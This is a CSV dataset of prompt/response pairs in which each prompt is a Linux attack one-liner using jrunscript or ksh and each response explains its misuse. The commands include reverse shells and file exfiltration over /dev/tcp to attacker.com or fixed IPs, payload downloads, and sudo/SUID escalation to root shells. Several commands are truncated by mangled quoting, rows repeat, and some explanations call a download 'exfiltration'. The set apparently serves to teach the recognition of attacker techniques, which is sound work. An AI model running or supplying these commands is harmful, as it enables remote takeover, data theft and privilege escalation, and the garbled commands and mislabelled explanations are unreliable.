prompt,response
"export RHOST=50.50.50.50 ; export RPORT=12345 ; jrunscript -e 'var host='""""'""""""""$RHOST""""""""'""""'; var port='""""$RPORT""""'; ; var p=new java.lang.ProcessBuilder(""""/bin/bash""""","This command sets the RHOST and RPORT variables, then uses jrunscript to execute a bash shell on the target machine, connecting back to the IP address and port specified in the variables. This could be used to establish a reverse shell on the target machine, allowing an attacker to execute commands and potentially gain full access to the system."
"export RHOST=10.10.10.10 ; export RPORT=12345 ; jrunscript -e 'var host='""""'""""""""$RHOST""""""""'""""'; var port='""""$RPORT""""'; ; var p=new java.lang.ProcessBuilder(""""/bin/bash""""","This command exports the RHOST and RPORT variables, then uses jrunscript to execute a Java script that creates a new process builder for /bin/bash on the specified RHOST and RPORT. This could potentially be used in a cyberattack to establish a reverse shell on the target machine."
"URL=http://attacker.com/file_to_get ; LFILE=file_to_save ; jrunscript -e """"cp('$URL'",This command can be used to download a file from an attacker-controlled website and save it to a specified location on the victim's machine using the jrunscript utility.
"URL=http://50.50.50.50/file_to_get ; LFILE=file_to_save ; jrunscript -e """"cp('$URL'","This command can be used to download a file from a remote server and save it locally using jrunscript, potentially allowing an attacker to execute malicious code on the target machine."
"URL=http://10.10.10.10/file_to_get ; LFILE=file_to_save ; jrunscript -e """"cp('$URL'","This command can be used to download a file from a remote server and save it locally using jrunscript, which is a built-in utility in Java. It can be used in a cyberattack to download and execute malicious files on a Linux machine."
"jrunscript -e 'var fw=new java.io.FileWriter(""""./file_to_write""""); fw.write(""""DATA""""); fw.close();'","This command can be used to write data to a file on a Linux machine, potentially allowing an attacker to exfiltrate sensitive information or plant malicious code."
"jrunscript -e 'br = new BufferedReader(new java.io.FileReader(""""file_to_read"""")); while ((line = br.readLine()) != null) { print(line); }'","This command can be used to read the contents of a file and print them to the console, potentially allowing an attacker to gather sensitive information from a compromised system."
"sudo install -m =xs $(which jrunscript) . ;  ; ./jrunscript -e """"exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')""""",This command can be used to execute arbitrary code on a Linux machine by leveraging the jrunscript utility and running a shell command with escalated privileges.
"sudo jrunscript -e """"exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')""""","This command can be used to execute arbitrary shell commands with elevated privileges, potentially allowing an attacker to gain full control of the system."
ksh,"Potential use in a cyberattack: Running shell scripts or commands in a different shell than the default bash shell to evade detection.
What it might do on a Linux machine: Launch the Korn shell, an alternative shell to bash, for executing commands and scripts."
export RHOST=attacker.com ; export RPORT=12345 ; ksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1',"This command sets up a reverse shell to an attacker's machine, allowing them to execute commands on the compromised Linux machine."
export RHOST=50.50.50.50 ; export RPORT=12345 ; ksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1',This command can be used for remote access to a victim's machine by setting up a reverse shell to connect back to the attacker's machine at IP address 50.50.50.50 on port 12345 using the Korn shell (ksh).
export RHOST=10.10.10.10 ; export RPORT=12345 ; ksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1',"This command sets up a reverse shell to a specified IP address and port using the Korn shell, allowing an attacker to remotely access and control the victim machine."
export RHOST=attacker.com ; export RPORT=12345 ; export LFILE=file_to_send ; ksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT',This command can be used to exfiltrate data from a compromised Linux machine to an attacker-controlled server by sending a file over a TCP connection.
export RHOST=50.50.50.50 ; export RPORT=12345 ; export LFILE=file_to_send ; ksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT',This command can be used to exfiltrate data from a compromised Linux machine by sending a file to a remote server over TCP.
export RHOST=10.10.10.10 ; export RPORT=12345 ; export LFILE=file_to_send ; ksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT',This command can be used to exfiltrate data from a compromised Linux machine by sending a file to a remote host and port using the ksh shell.
export RHOST=attacker.com ; export RPORT=12345 ; export LFILE=file_to_send ; ksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT',This command can be used to exfiltrate data from a compromised Linux machine to an attacker-controlled server by sending a file over a TCP connection.
export RHOST=50.50.50.50 ; export RPORT=12345 ; export LFILE=file_to_send ; ksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT',This command can be used to exfiltrate data from a compromised Linux machine by sending a file to a remote server over TCP.
export RHOST=10.10.10.10 ; export RPORT=12345 ; export LFILE=file_to_send ; ksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT',This command can be used to exfiltrate data from a compromised Linux machine by sending a file to a remote host and port using the ksh shell.
export RHOST=attacker.com ; export RPORT=12345 ; export LFILE=file_to_get ; ksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE',This command can be used to exfiltrate data from a compromised Linux machine to an attacker-controlled server over a TCP connection.
export RHOST=50.50.50.50 ; export RPORT=12345 ; export LFILE=file_to_get ; ksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE',"This command can be used to download a file from a remote server and save it locally on the machine, potentially allowing an attacker to exfiltrate sensitive data or install malware on the compromised system."
export RHOST=10.10.10.10 ; export RPORT=12345 ; export LFILE=file_to_get ; ksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE',"This command can be used to download a file from a remote server and save it locally on the machine, potentially allowing an attacker to exfiltrate sensitive data or install malware on the compromised system."
export RHOST=attacker.com ; export RPORT=12345 ; export LFILE=file_to_get ; ksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE',This command can be used to exfiltrate data from a compromised Linux machine to an attacker-controlled server over a TCP connection.
export RHOST=50.50.50.50 ; export RPORT=12345 ; export LFILE=file_to_get ; ksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE',"This command can be used to download a file from a remote server and save it locally on the machine, potentially allowing an attacker to exfiltrate sensitive data or install malware on the compromised system."
export RHOST=10.10.10.10 ; export RPORT=12345 ; export LFILE=file_to_get ; ksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE',"This command can be used to download a file from a remote server and save it locally, potentially allowing an attacker to exfiltrate sensitive data from the victim machine."
export LFILE=file_to_write ; ksh -c 'echo DATA > $LFILE',"This command can be used to write data to a file specified by the user-controlled variable LFILE, which could potentially be used to write malicious code or exfiltrate data from the compromised machine."
"export LFILE=file_to_read ; ksh -c $'read -r -d \x04 < """"$LFILE""""; echo """"$REPLY""""'","This command can be used to read the contents of a file and print it to the console, potentially allowing an attacker to exfiltrate sensitive data from a compromised system."
"export LFILE=file_to_read ; ksh -c $'read -r -d \x04 < """"$LFILE""""; echo """"$REPLY""""'","This command can be used to read the contents of a file and print it to the console, potentially allowing an attacker to exfiltrate sensitive data from a compromised system."
